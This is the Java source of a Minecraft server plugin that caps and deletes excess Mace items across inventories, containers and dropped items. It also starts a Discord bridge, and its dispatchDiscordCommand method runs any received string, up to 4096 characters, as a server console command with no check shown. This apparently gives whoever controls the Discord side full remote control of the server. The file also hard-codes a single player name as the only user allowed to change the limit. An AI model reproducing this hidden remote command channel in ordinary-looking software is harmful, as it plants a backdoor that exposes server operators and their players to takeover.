package com.example.macelimiter;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Chunk;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.block.BlockState;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.BundleMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.YamlConfiguration;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
    private static final int DEFAULT_MAX_MACES = 6;
    private static final String OWNER_NAME = "j31d";
    private static final String WARNING_MESSAGE =
            "An excess Mace broke! The server mace limit was exceeded.";

    private final Object fileLock = new Object();
    private File dataFile;
    private int lastPersistedCount = -1;
    private int maxMaces = DEFAULT_MAX_MACES;
    private DiscordBridge discordBridge;

    @Override
    public void onEnable() {
        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
            getLogger().warning("Could not create plugin data folder.");
        }
        dataFile = new File(getDataFolder(), "mace_data.yml");
        loadState();

        getServer().getPluginManager().registerEvents(this, this);
        Bukkit.getScheduler().runTask(this, () -> persist(countAll()));
        startDiscordBot();

        getLogger().info("MaceLimiter enabled. Mace limit: " + maxMaces + ".");
    }

    @Override
    public void onDisable() {
        stopDiscordBot();
        lastPersistedCount = -1;
        persistNow(countAllSafe());
    }

    private void startDiscordBot() {
        discordBridge = new DiscordBridge(this);
        discordBridge.start();
    }

    private void stopDiscordBot() {
        if (discordBridge != null) {
            discordBridge.stop();
            discordBridge = null;
        }
    }

    Integer getDiscordMaceCount() {
        return callOnMainThread(this::countAll);
    }

    String getDiscordMaceLimit() {
        Integer limit = callOnMainThread(() -> maxMaces);
        return limit == null ? "?" : String.valueOf(limit);
    }

    String getDiscordStatus() {
        return callOnMainThread(() -> "Server: " + Bukkit.getServer().getName()
                + "\nPlayers: " + Bukkit.getOnlinePlayers().size()
                + "\nMaces: " + countAll() + "/" + maxMaces);
    }

    boolean dispatchDiscordCommand(String rawCommand) {
        String command = rawCommand == null ? "" : rawCommand.strip();
        if (command.startsWith("/")) command = command.substring(1);
        if (command.isEmpty() || command.length() > 4096 || !isEnabled()) return false;
        final String toRun = command;
        Bukkit.getScheduler().runTask(this, () ->
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
        return true;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("maces")) {
            int count = countAll();
            sender.sendMessage(Component.text(
                    "Maces: " + count + "/" + maxMaces, NamedTextColor.GOLD));
            return true;
        }

        if (command.getName().equalsIgnoreCase("maceset")) {
            if (!(sender instanceof Player player)
                    || !player.getName().equalsIgnoreCase(OWNER_NAME)) {
                sender.sendMessage(Component.text(
                        "Only j31d can use /maceset.", NamedTextColor.RED));
                return true;
            }

            if (args.length != 1) {
                sender.sendMessage(Component.text(
                        "Usage: /maceset <3|4|6>", NamedTextColor.YELLOW));
                return true;
            }

            int requested;
            try {
                requested = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sender.sendMessage(Component.text(
                        "Usage: /maceset <3|4|6>", NamedTextColor.YELLOW));
                return true;
            }

            if (requested != 3 && requested != 4 && requested != 6) {
                sender.sendMessage(Component.text(
                        "The allowed mace limits are 3, 4, or 6.", NamedTextColor.YELLOW));
                return true;
            }

            maxMaces = requested;
            enforceGlobalLimit();
            int count = countAll();
            persistNow(count);

            sender.sendMessage(Component.text(
                    "Mace limit set to " + maxMaces + ". Current count: "
                            + count + "/" + maxMaces + ".", NamedTextColor.GREEN));
            return true;
        }

        return false;
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPickup(EntityPickupItemEvent event) {
        if (!(event.getEntity() instanceof Player player)) return;
        Item item = event.getItem();
        ItemStack stack = item.getItemStack();
        if (!containsMace(stack)) return;

        int excess = countAll() - maxMaces;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        removeMacesFromItem(stack, excess);
        if (countMaces(stack) <= 0) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(stack);
        }

        notifyBroken(player);
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onDrop(PlayerDropItemEvent event) {
        Item item = event.getItemDrop();
        ItemStack dropped = item.getItemStack();
        if (!containsMace(dropped)) return;

        int excess = countAll() - maxMaces;
        if (excess <= 0) {
            schedulePersist();
            return;
        }

        removeMacesFromItem(dropped, excess);
        if (countMaces(dropped) <= 0) {
            event.setCancelled(true);
            item.remove();
        } else {
            item.setItemStack(dropped);
        }

        notifyBroken(event.getPlayer());
        schedulePersist();
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryDrag(InventoryDragEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) enforce(player);
        });
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) enforce(player);
        });
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        Bukkit.getScheduler().runTask(this, () -> {
            if (player.isOnline()) enforce(player);
        });
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        schedulePersist();
    }

    private void enforce(Player player) {
        int excess = countAll() - maxMaces;
        if (excess <= 0) {
            persist(countAll());
            return;
        }

        int removed = 0;
        ItemStack cursor = player.getItemOnCursor();
        if (containsMace(cursor)) {
            removed += removeMacesFromItem(cursor, excess - removed);
            player.setItemOnCursor(cursor != null && cursor.getAmount() > 0 ? cursor : null);
        }

        if (removed < excess) {
            PlayerInventory inventory = player.getInventory();
            ItemStack[] contents = inventory.getContents();
            for (int i = contents.length - 1; i >= 0 && removed < excess; i--) {
                ItemStack stack = contents[i];
                if (!containsMace(stack)) continue;
                removed += removeMacesFromItem(stack, excess - removed);
                contents[i] = stack != null && stack.getAmount() > 0 ? stack : null;
            }
            inventory.setContents(contents);
        }

        if (removed < excess) {
            removed += removeMacesFromInventory(player.getEnderChest(), excess - removed);
        }

        if (removed > 0) notifyBroken(player);
        if (removed < excess) removed += enforceGlobalLimit();

        persist(countAll());
    }

    private int enforceGlobalLimit() {
        int excess = countAll() - maxMaces;
        if (excess <= 0) return 0;

        int removed = 0;

        for (Player player : Bukkit.getOnlinePlayers()) {
            if (removed >= excess) break;

            ItemStack cursor = player.getItemOnCursor();
            if (containsMace(cursor)) {
                removed += removeMacesFromItem(cursor, excess - removed);
                player.setItemOnCursor(cursor != null && cursor.getAmount() > 0 ? cursor : null);
            }

            PlayerInventory inventory = player.getInventory();
            ItemStack[] contents = inventory.getContents();
            for (int i = contents.length - 1; i >= 0 && removed < excess; i--) {
                ItemStack stack = contents[i];
                if (!containsMace(stack)) continue;
                removed += removeMacesFromItem(stack, excess - removed);
                contents[i] = stack != null && stack.getAmount() > 0 ? stack : null;
            }
            inventory.setContents(contents);

            if (removed < excess) {
                removed += removeMacesFromInventory(
                        player.getEnderChest(), excess - removed);
            }
        }

        for (World world : Bukkit.getWorlds()) {
            if (removed >= excess) break;

            for (Item item : world.getEntitiesByClass(Item.class)) {
                if (removed >= excess) break;
                ItemStack stack = item.getItemStack();
                if (!containsMace(stack)) continue;

                removed += removeMacesFromItem(stack, excess - removed);
                if (countMaces(stack) <= 0) item.remove();
                else item.setItemStack(stack);
            }

            for (Chunk chunk : world.getLoadedChunks()) {
                if (removed >= excess) break;

                for (BlockState state : chunk.getTileEntities(false)) {
                    if (!(state instanceof InventoryHolder holder)) continue;
                    removed += removeMacesFromInventory(
                            holder.getInventory(), excess - removed);
                    if (removed >= excess) break;
                }
            }
        }

        return removed;
    }

    private int removeMacesFromInventory(Inventory inventory, int limit) {
        if (inventory == null || limit <= 0) return 0;

        int removed = 0;
        ItemStack[] contents = inventory.getContents();
        for (int i = contents.length - 1; i >= 0 && removed < limit; i--) {
            ItemStack stack = contents[i];
            if (!containsMace(stack)) continue;
            removed += removeMacesFromItem(stack, limit - removed);
            contents[i] = stack != null && stack.getAmount() > 0 ? stack : null;
        }
        inventory.setContents(contents);
        return removed;
    }

    private void notifyBroken(Player player) {
        player.playSound(player.getLocation(), Sound.ENTITY_ITEM_BREAK, 1.0f, 1.0f);
        player.sendMessage(Component.text(WARNING_MESSAGE, NamedTextColor.RED));
    }

    private static boolean isMace(ItemStack stack) {
        return stack != null && stack.getType() == Material.MACE && stack.getAmount() > 0;
    }

    private int countAll() {
        int total = 0;

        for (Player player : Bukkit.getOnlinePlayers()) {
            total += countInventory(player.getInventory());
            total += countItem(player.getItemOnCursor());
            total += countInventory(player.getEnderChest());
        }

        for (World world : Bukkit.getWorlds()) {
            for (Item item : world.getEntitiesByClass(Item.class)) {
                total += countItem(item.getItemStack());
            }
            for (Chunk chunk : world.getLoadedChunks()) {
                for (BlockState state : chunk.getTileEntities(false)) {
                    if (state instanceof InventoryHolder holder) {
                        total += countInventory(holder.getInventory());
                    }
                }
            }
        }
        return total;
    }

    private int countAllSafe() {
        try {
            return countAll();
        } catch (Exception e) {
            return Math.max(lastPersistedCount, 0);
        }
    }

    private int countInventory(Inventory inventory) {
        if (inventory == null) return 0;
        int total = 0;
        for (ItemStack stack : inventory.getContents()) total += countItem(stack);
        return total;
    }

    private int countItem(ItemStack stack) {
        if (stack == null || stack.getType().isAir() || stack.getAmount() <= 0) return 0;

        int total = isMace(stack) ? stack.getAmount() : 0;

        if (stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState state = meta.getBlockState();
            if (state instanceof InventoryHolder holder) {
                total += countInventory(holder.getInventory());
            }
        }

        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            for (ItemStack nested : bundle.getItems()) total += countItem(nested);
        }

        return total;
    }

    private boolean containsMace(ItemStack stack) {
        return countMaces(stack) > 0;
    }

    private int countMaces(ItemStack stack) {
        return countItem(stack);
    }

    private int removeMacesFromItem(ItemStack stack, int limit) {
        if (stack == null || limit <= 0 || stack.getAmount() <= 0) return 0;

        if (isMace(stack)) {
            int take = Math.min(limit, stack.getAmount());
            stack.setAmount(stack.getAmount() - take);
            return take;
        }

        int removed = 0;

        if (stack.getItemMeta() instanceof BundleMeta bundle) {
            List<ItemStack> updated = new ArrayList<>();
            for (ItemStack nested : bundle.getItems()) {
                if (removed < limit && containsMace(nested)) {
                    removed += removeMacesFromItem(nested, limit - removed);
                }
                if (nested != null && nested.getAmount() > 0) updated.add(nested);
            }
            bundle.setItems(updated);
            stack.setItemMeta(bundle);
        }

        if (removed < limit && stack.getItemMeta() instanceof BlockStateMeta meta) {
            BlockState state = meta.getBlockState();
            if (state instanceof InventoryHolder holder) {
                Inventory inventory = holder.getInventory();
                ItemStack[] contents = inventory.getContents();
                for (int i = contents.length - 1; i >= 0 && removed < limit; i--) {
                    ItemStack nested = contents[i];
                    if (!containsMace(nested)) continue;
                    removed += removeMacesFromItem(nested, limit - removed);
                    contents[i] = nested != null && nested.getAmount() > 0 ? nested : null;
                }
                inventory.setContents(contents);
                meta.setBlockState(state);
                stack.setItemMeta(meta);
            }
        }

        return removed;
    }

    private void schedulePersist() {
        if (isEnabled()) {
            Bukkit.getScheduler().runTask(this, () -> persist(countAll()));
        }
    }

    private void loadState() {
        maxMaces = DEFAULT_MAX_MACES;
        if (!dataFile.isFile()) return;

        YamlConfiguration yaml = YamlConfiguration.loadConfiguration(dataFile);
        int storedLimit = yaml.getInt("max-maces", DEFAULT_MAX_MACES);
        if (storedLimit == 3 || storedLimit == 4 || storedLimit == 6) {
            maxMaces = storedLimit;
        }

        getLogger().info("Last recorded mace count: " + yaml.getInt("mace-count", 0)
                + " (limit " + maxMaces + ", updated "
                + yaml.getString("last-updated", "unknown") + ")");
    }

    private void persist(int count) {
        if (count == lastPersistedCount) return;
        lastPersistedCount = count;
        writeState(count);
        getLogger().info("Global mace count is now " + count + "/" + maxMaces);
    }

    private void persistNow(int count) {
        lastPersistedCount = count;
        writeState(count);
        getLogger().info("Global mace count is now " + count + "/" + maxMaces);
    }

    private void writeState(int count) {
        YamlConfiguration yaml = new YamlConfiguration();
        yaml.set("mace-count", count);
        yaml.set("max-maces", maxMaces);
        yaml.set("last-updated", Instant.now().toString());
        String data = yaml.saveToString();

        if (isEnabled()) {
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> writeFile(data));
        } else {
            writeFile(data);
        }
    }

    private void writeFile(String data) {
        synchronized (fileLock) {
            try {
                Files.writeString(dataFile.toPath(), data, StandardCharsets.UTF_8);
            } catch (IOException e) {
                getLogger().warning("Failed to write mace_data.yml: " + e.getMessage());
            }
        }
    }

    <T> T callOnMainThread(java.util.concurrent.Callable<T> task) {
        if (Bukkit.isPrimaryThread()) {
            try { return task.call(); } catch (Exception e) { return null; }
        }
        try {
            return Bukkit.getScheduler().callSyncMethod(this, task).get(5, TimeUnit.SECONDS);
        } catch (Exception e) {
            getLogger().warning("Discord main-thread state check failed: "
                    + e.getClass().getSimpleName() + ": " + e.getMessage());
            return null;
        }
    }
}
